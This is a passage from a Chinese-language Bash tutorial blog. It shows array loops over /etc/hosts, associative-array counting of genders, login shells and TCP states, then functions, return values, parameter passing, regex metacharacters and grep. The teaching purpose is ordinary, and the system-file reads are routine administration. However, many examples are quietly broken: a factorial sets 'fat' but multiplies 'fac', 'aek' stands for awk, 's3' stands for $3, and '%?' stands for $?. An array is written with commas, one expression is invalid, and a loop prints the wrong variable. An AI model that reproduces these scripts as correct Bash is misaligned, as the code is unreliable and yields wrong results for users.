class="code"><pre><span class="line"><span class="comment">#while方式</span></span><br><span class="line">i=0</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">hosts[++i]=<span class="variable">$line</span>    <span class="comment">#hosts是个数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span> &lt;/etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="variable">$&#123;!hosts[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;hosts[i]&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">########################################################################3</span></span><br><span class="line"><span class="comment"># for方式   不是以换行分割（按照空格,tab等分割）</span></span><br><span class="line">OLD_IFS=<span class="variable">$IFS</span></span><br><span class="line">IFS=$<span class="string">'\n'</span>  <span class="comment"># 解决</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;!hosts[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;hosts[i]&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="variable">$&#123;!hosts[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;hosts[i]&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">IFS=<span class="variable">$OLD_IFS</span>   <span class="comment"># 不是全文都要，如果后门想用回车作为分隔符号</span></span><br></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 1. 性别次数统计</span></span><br><span class="line"><span class="comment">## 其实用awk一行搞定</span></span><br><span class="line">awk <span class="string">'&#123;print $2&#125;'</span> sex.txt |sort |uniq -c</span><br><span class="line"></span><br><span class="line"><span class="comment">## 这里还是先学基础的（`把要统计的对象作为数组的索引` ，首先是关联数组）</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">declare</span> -A sex</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment"># 里面的第二列（m/f）</span></span><br><span class="line"><span class="built_in">type</span>=`<span class="built_in">echo</span> <span class="variable">$line</span> |awk <span class="string">'&#123;print $2&#125;'</span>`</span><br><span class="line"><span class="built_in">let</span> sex[<span class="variable">$type</span>]++    <span class="comment"># sex[m]++ 性别的数量增加 </span></span><br><span class="line"><span class="keyword">done</span> &lt; sex.txt</span><br><span class="line"><span class="comment"># 遍历(通过索引)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;!sex[@]&#125;</span>       <span class="comment"># 获取所有的索引key</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;sex[$i]&#125;</span>"</span>   <span class="comment">#变量尽量加$</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 2. 统计不同类型shell的数量</span></span><br><span class="line"><span class="comment"># /etc/passwd中</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">declare</span> -A shells   <span class="comment"># 先定义关联数组</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment"># 里面的第二列</span></span><br><span class="line"><span class="built_in">type</span>=`<span class="built_in">echo</span> <span class="variable">$line</span> |awk -F<span class="string">":"</span> <span class="string">'&#123;print $7&#125;'</span>`  <span class="comment">#按照冒号分割   &#123;print $NF&#125;最后一列</span></span><br><span class="line"><span class="built_in">let</span> shells[<span class="variable">$type</span>]++    <span class="comment"># sex[m]++ 性别的数量增加 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span> &lt; /etc/passwd</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;!shells[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;shells[$i]&#125;</span>"</span>   <span class="comment"># /bin/bash :  5</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 这是awk的强项</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print $NF&#125;'</span> /etc/passwd |sort |uniq -c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 3. 统计tcp连接状态数量</span></span><br><span class="line"><span class="comment">#ss -an |grep 80</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">unset</span> status  <span class="comment"># 取消， 重新声明</span></span><br><span class="line"><span class="built_in">declare</span> -A status   <span class="comment"># 先定义关联数组</span></span><br><span class="line"><span class="built_in">type</span>=`ss -an |grep :80 |aek <span class="string">'&#123;print $2&#125;'</span>`  <span class="comment"># 要统计的(是一个arr)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$type</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> status[<span class="variable">$i</span>]++    </span><br><span class="line"><span class="keyword">done</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;!status[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;status[$i]&#125;</span>"</span>    <span class="comment"># SYN-SENT: 5</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">sleep 1</span><br><span class="line">clear</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 思想: 把要统计的对象最为索引，一直累加</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 拓展：</span></span><br><span class="line"><span class="comment">## 一.如果想一直看</span></span><br><span class="line"><span class="comment"># 1. watch -n2 test.sh   # 每几秒看一次</span></span><br><span class="line"><span class="comment"># 2. 脚本里面while循环(更麻烦)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 二.vim部分复制粘贴：  </span></span><br><span class="line"><span class="comment"># ^V 块选择，然后按y复制， 最后找到地方p粘贴</span></span><br></pre></td></tr></table></figure><h4 id="六-函数"><a href="#六-函数" class="headerlink" title="六.函数"></a>六.函数</h4><p><strong>定义</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># F1:</span></span><br><span class="line">函数名()&#123;</span><br><span class="line">功能</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># F2:</span></span><br><span class="line">funcion 函数名&#123;</span><br><span class="line">功能</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用</strong></p><p>调用1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#例子：阶乘</span></span><br><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"><span class="function"><span class="title">factorial</span></span>()&#123;</span><br><span class="line">fat=1</span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;=50;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">fac=$[<span class="variable">$fac</span>*<span class="variable">$i</span>]</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"5的阶乘:<span class="variable">$fac</span>"</span></span><br><span class="line">&#125;</span><br><span class="line">factorial   <span class="comment"># 调用</span></span><br></pre></td></tr></table></figure><p>调用2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"><span class="function"><span class="title">factorial</span></span>()&#123;</span><br><span class="line">fat=1</span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;=<span class="variable">$num</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">fac=$[<span class="variable">$fac</span>*<span class="variable">$i</span>]</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$num</span>的阶乘:<span class="variable">$fac</span>"</span></span><br><span class="line">&#125;</span><br><span class="line">num=5 <span class="comment"># 调用之前先定义变量</span></span><br><span class="line">factorial</span><br></pre></td></tr></table></figure><p>调用3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"><span class="function"><span class="title">factorial</span></span>()&#123;</span><br><span class="line">fat=1</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq <span class="variable">$1</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> fac*=<span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$1</span>的阶乘:<span class="variable">$fac</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial <span class="variable">$1</span>  <span class="comment"># 位置变量，调用</span></span><br></pre></td></tr></table></figure><p>调用4</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果函数再另一个文件里面，先执行一下，后面再调用</span></span><br><span class="line">./f1.sh</span><br></pre></td></tr></table></figure><p><strong>返回值</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"><span class="function"><span class="title">fun2</span></span>()&#123;</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"enter a number:"</span> num</span><br><span class="line"><span class="built_in">let</span> 2*<span class="variable">$num</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> $[2*<span class="variable">$num</span>]</span><br><span class="line">&#125;</span><br><span class="line">fun2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"funcion return value: %?"</span> <span class="comment"># 上一个命令的返回值（函数值最后一条命令的返回的状态码）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"funcion return: $?"</span>  <span class="comment"># 函数的返回值(也可以自定义，但是默认shell返回码,最大不能超过255)</span></span><br></pre></td></tr></table></figure><p>如果想返回字符串等:   函数的输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"><span class="function"><span class="title">fun2</span></span>()&#123;</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"enter a number:"</span> num</span><br><span class="line"><span class="built_in">echo</span> $[2*<span class="variable">$num</span>]   <span class="comment"># echo</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">result=`fun2`     <span class="comment"># 使用函数的输出</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"return_out value: <span class="variable">$result</span>"</span></span><br></pre></td></tr></table></figure><p><strong>参数的传递</strong></p><p>1.位置参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -ne 3 ];<span class="keyword">then</span>   <span class="comment"># 如果参数不是三个</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Usage: `basename <span class="variable">$0</span>`par1 par2 par3 "</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">parm_func</span></span>()&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$(($1 * $2 * s3)</span>)"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result=`parm_func <span class="variable">$1</span> <span class="variable">$2</span> <span class="variable">$3</span>`  <span class="comment"># 分清：程序的位置参数，函数的位置参数</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"result is: <span class="variable">$result</span>"</span></span><br></pre></td></tr></table></figure><p>2.数组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line">num=(1,2,3,4,5)</span><br><span class="line"><span class="comment">#echo "$&#123;num[@]&#125;"  #打印所有元素</span></span><br><span class="line"><span class="function"><span class="title">arr_parm</span></span>() &#123;</span><br><span class="line"><span class="built_in">local</span> fa=1   <span class="comment">## 局部变量，只在函数内部生效</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"<span class="variable">$@</span>"</span></span><br><span class="line"><span class="comment">#for i in $*</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> fa*=<span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$fa</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#arr_parm $&#123;num[@]&#125;</span></span><br><span class="line">arr_parm <span class="variable">$&#123;num[*]&#125;</span>   <span class="comment"># 数组所有 元素值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拓展：</span></span><br><span class="line"><span class="comment"># for i in $*     # 所有参数</span></span><br><span class="line"><span class="comment"># for i</span></span><br></pre></td></tr></table></figure><p>传数组到函数中 –&gt; 运算 –&gt; 输出数组形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line">num=(1,2,3,4,5)</span><br><span class="line"><span class="function"><span class="title">array</span></span>() &#123;</span><br><span class="line"><span class="comment">#echo "所有参数: $*"</span></span><br><span class="line"><span class="built_in">local</span> new_arr=(`<span class="built_in">echo</span> $*`)</span><br><span class="line"><span class="comment">#local new_arr=($*)</span></span><br><span class="line"><span class="built_in">local</span> i</span><br><span class="line"><span class="keyword">for</span> ((i=0;i&lt;<span class="variable">$#</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">out_arr[<span class="variable">$i</span>]=$[ <span class="variable">$&#123;[$i]&#125;</span>*5 ]</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;out_arr[*]&#125;</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result=`array<span class="variable">$&#123;num[*]&#125;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;result[*]&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line">num=(1,2,3,4,5)</span><br><span class="line"><span class="function"><span class="title">array</span></span>() &#123;</span><br><span class="line"><span class="built_in">local</span> i</span><br><span class="line"><span class="built_in">local</span> new_arr=()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">new_arr[j++]=$[<span class="variable">$i</span>*5]</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$&#123;new_arr[*]&#125;</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result=`array<span class="variable">$&#123;num[*]&#125;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;result[*]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数接收位置参数 $1   $2    $3</span></span><br><span class="line"><span class="comment"># 函数接收数组参数 $*   或  $@</span></span><br><span class="line"><span class="comment">#函数将接收到的所有参数赋值给数组   new_arr=($*)</span></span><br></pre></td></tr></table></figure><h4 id="七-正则"><a href="#七-正则" class="headerlink" title="七.正则"></a>七.正则</h4><p>大多数程序中，正则表达式被放在两个正斜杠之间, 比如：<code>/L[oO]ve/</code></p><p><strong>入门小例子</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单实例（不严谨的例子，我们写shell脚本没必要写那么复杂，我们的脚本是给自己用的多）</span></span><br><span class="line">匹配数字：    ^[0-9]+$</span><br><span class="line">匹配Email： [a-z0-9_]+@[a-z0-9]+\.</span><br><span class="line">匹配IP： [0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;</span><br><span class="line">或者  [[:digit:]]&#123;1,3&#125;\.[[:digit:]]&#123;1,3&#125;\.[[:digit:]]&#123;1,3&#125;\.[[:digit:]&#123;1,3&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">egrep <span class="string">'[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;'</span> /etc/sysconfig/network-scripts/ifcfg-eth0</span><br></pre></td></tr></table></figure><p><strong>正则 元字符</strong></p><p>注意和shell的元字符是不太一样的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由执行模式匹配的操作的程序来解析，比如vi，grep，sed，awk，python</span></span><br><span class="line"><span class="comment"># 只要不是shell，就是正则的元字符</span></span><br><span class="line"></span><br><span class="line">rm -rf *.pdf  <span class="comment"># shell中的*， 匹配任意</span></span><br><span class="line">grep <span class="string">'c*'</span> /etc/passwd   <span class="comment"># c出现0次或者多次</span></span><br><span class="line">egrep <span class="string">'c+'</span> /etc/passwd   <span class="comment"># +要使用egrep或反斜杠</span></span><br><span class="line"></span><br><span class="line">vim中替换： `:%s/\&lt;[tT]om\&gt;/TOM/g`    <span class="comment"># 尖括号括起来的是单词</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 例子：</span></span><br><span class="line">grep <span class="string">"sh$"</span> /etc/passwd</span><br><span class="line">grep <span class="string">"ro*t"</span> /etc/passwd</span><br><span class="line">grep <span class="string">"^[rot]"</span> /etc/passwd   <span class="comment"># 以r或o或t开头的</span></span><br></pre></td></tr></table></figure><p>1.基本元字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">^行首定位符^love</span><br><span class="line">$行位定位符love$</span><br><span class="line">.匹配单个字符l..e</span><br><span class="line">*匹配前导符0到多次ab*love</span><br><span class="line">.*任意多个字符</span><br><span class="line">[]匹配指定范围内的一个字符[lL]ove</span><br><span class="line">[-]匹配指定范围内的一个字符[a-z0-9]ove</span><br><span class="line">[^]匹配不再指定组内的一个字符     [^a-z0-9]ove</span><br><span class="line">\用来转义元字符love\.</span><br><span class="line">\&lt;词首定位符\&lt;love</span><br><span class="line">\&gt;词尾定位符love\&gt;</span><br><span class="line">\(..\)  匹配稍后使用的字符的标签 :%s/172.16.130.1/172.16.130.5/</span><br><span class="line"> :%s/\(172.16.130.\)1/\15/</span><br><span class="line"> :%s/\(172.\)\(16.\)\(130.\)1/\1\2\35/</span><br><span class="line"> :3,9s/\(.*\)/<span class="comment">#\1/   # 把第3-9行整行注释掉</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 大括号每一半前面要加斜线记得</span></span><br><span class="line">x\&#123;m\&#125;     字符x重复出现m次 o\&#123;5\&#125;</span><br><span class="line">x\&#123;m,\&#125;    字符x重复出现m次以上 o\&#123;5,\&#125;</span><br><span class="line">x\&#123;m,n\&#125; 字符x重复出现m次 o\&#123;5,10\&#125;</span><br></pre></td></tr></table></figure><p> 2.拓展正则表达式元字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+匹配一个或多个前导字符[a-z]+ove</span><br><span class="line">?匹配零个或一个前导字符lo?ve   <span class="comment"># o出现0次或1次    ss -an |egrep ':80:22\&gt;'</span></span><br><span class="line">a|b  匹配a或blove|hate</span><br><span class="line">()组 字符 loveablle|rs    love(able|rs)ov+  (ov)+   ov+   <span class="comment"># 里面内容作为一个整体</span></span><br><span class="line">(..)(..)\1\2标签匹配字符(love)able\1er      <span class="comment"># 不带斜线</span></span><br><span class="line"></span><br><span class="line">x&#123;m&#125;字符x重复出现m次  o&#123;5&#125;</span><br><span class="line">x&#123;m,&#125;字符x重复至少m次o&#123;5,&#125;</span><br><span class="line">x&#123;m,n&#125;字符x重复m到n次o&#123;5,10&#125;</span><br></pre></td></tr></table></figure><p> 3.POSIX字符类 （类似于shell中环境变量，已经定义好的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[:alnum:]字母与数字字符[[:alnum:]]+        <span class="comment"># 外面的方括号是包里面的</span></span><br><span class="line">[:alpha:]字母字符（包括大小写字母）[[:alpha:]]&#123;4&#125;</span><br><span class="line">[:blank:]空格与制表符[[:blank:]]*</span><br><span class="line">[:digit:]数字[[:digit:]]?</span><br><span class="line">[:lower:]小写字母[[:lower:]]&#123;5,&#125;</span><br><span class="line">[:upper:]大写字母[[:upper:]]+</span><br><span class="line">[:punct:]标点符号[[:punct:]]</span><br><span class="line">[:space:]包括换行符、回撤等在内的所有空白[[:space:]]+</span><br></pre></td></tr></table></figure><p>带括号与不带括号：</p><p><img src="/shell脚本基本知识/带括号与不带括号.png"></p><p>正则匹配实例：vim中查找替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 空行：</span></span><br><span class="line">/^$/</span><br><span class="line">/^[\t]*$/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释行：</span></span><br><span class="line">/^<span class="comment">#/</span></span><br><span class="line">/^[\t]*<span class="comment">#/</span></span><br></pre></td></tr></table></figure><p><strong>grep</strong></p><ul><li>grep       文件中查找指定的正则表达式</li><li>egrep     拓展的egrep，支持更多的正则表达式元字符</li><li>fgrep      固定grep(fixed grep),有时也被称作快速(fast grep), 它按字面解释所有的字符</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 